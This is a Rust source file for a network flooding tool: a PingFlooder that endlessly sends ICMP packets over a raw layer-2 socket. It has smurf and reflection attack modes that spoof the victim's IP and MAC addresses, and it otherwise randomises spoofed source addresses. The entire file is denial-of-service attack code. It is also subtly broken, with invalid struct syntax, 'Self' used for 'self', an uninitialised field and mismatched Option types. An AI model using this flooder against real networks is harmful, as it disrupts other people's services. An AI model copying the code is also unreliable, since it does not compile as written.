use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::net::Ipv4Addr;
use crate::arg_parser::PingArgs;
use crate::generators::RandValues;
use crate::iface::IfaceInfo;
use crate::pkt_builder::PacketBuilder;
use crate::sockets::Layer2RawSocket;
use crate::utils::{inline_display, get_first_and_last_ip, CtrlCHandler, use_local_or_input_mac};



pub struct PingFlooder {
    args:       PingArgs,
    rand:       RandValues,
    builder:    PacketBuilder,
    iface:      String,
    broadcast:  Ipv4Addr,
    pkts_sent:  usize,
    pkt_info:   PacketInfo,
}


struct PacketInfo {
    src_ip:  Option<Ipv4Addr>,
    src_mac: Option<[u8; 6]>,
    dst_ip:  Option<Ipv4Addr>,
    dst_mac: Option<[u8; 6]>,
}



impl PingFlooder {

    pub fn new(args: PingArgs) -> Self {
        let iface = IfaceInfo::iface_name_from_ip(args.target_ip);
        let (first_ip, last_ip) = get_first_and_last_ip(&iface);

        Self {
            rand:      RandValues::new(Some(first_ip), Some(last_ip)),
            builder:   PacketBuilder::new(),
            pkts_sent: 0,
            pkt_info:  PacketInfo {None, None, None, None},
            iface,
            args,
        }
    }

    
    
    pub fn execute(&mut self){
        Self.set_pkt_info();
        self.send_endlessly();
    }



    fn set_pkt_info(&mut self) {
        if self.args.smurf {
            self.set_info_for_smurf_attack();
        } else if self.args.mirror_ip {
            self.set_info_for_reflection_attck();
        }
    }



    fn set_info_for_smurf_attack(&mut self) {
        self.pkt_info.src_ip  = self.args.target_ip;
        self.pkt_info.src_mac = self.args.target_mac;
        self.pkt_info.dst_ip  = IfaceInfo::get_broadcast_ip(&self.iface);
        self.pkt_info.dst_mac = [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF];
    }



    fn set_info_for_reflection_attck(&mut self) {
        self.pkt_info.src_ip  = self.args.target_ip;
        self.pkt_info.src_mac = self.args.target_mac;
        self.pkt_info.dst_ip  = self.args.mirror_ip.unwrap();
        self.pkt_info.dst_mac = use_local_or_input_mac(&self.args.mirror_mac);
    }

    

    fn send_endlessly(&mut self) {
        let l2_socket = Layer2RawSocket::new(&self.iface);
        let running   = Arc::new(AtomicBool::new(true));
        CtrlCHandler::setup(running.clone());

        while running.load(Ordering::SeqCst) {
            let pkt = self.get_packet();
            l2_socket.send(pkt);
            
            self.pkts_sent += 1;
            inline_display(&format!("Packets sent: {}", &self.pkts_sent));
        }
        
        println!("\nFlood interrupted");
    }



    #[inline]
    fn get_packet(&mut self) -> &[u8] {
        let (src_mac, src_ip) = self.get_src_addrs();
        let (dst_mac, dst_ip) = self.get_dst_addrs();

        self.builder.icmp_ping_ether(
            src_mac, src_ip,
            dst_mac, dst_ip
        )
    }



    #[inline]
    fn get_src_addrs(&mut self) -> ([u8; 6], Ipv4Addr) {
        if self.args.smurf {
            return (self.args.target_mac, self.args.target_ip);
        }

        (self.rand.get_random_mac(), self.rand.get_random_ip())
    }



    #[inline]
    fn get_dst_addrs(&mut self) -> ([u8; 6], Ipv4Addr) {
        if self.args.smurf {
            return ([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF], self.broadcast);
        }

        (self.args.target_mac, self.args.target_ip)
    }

}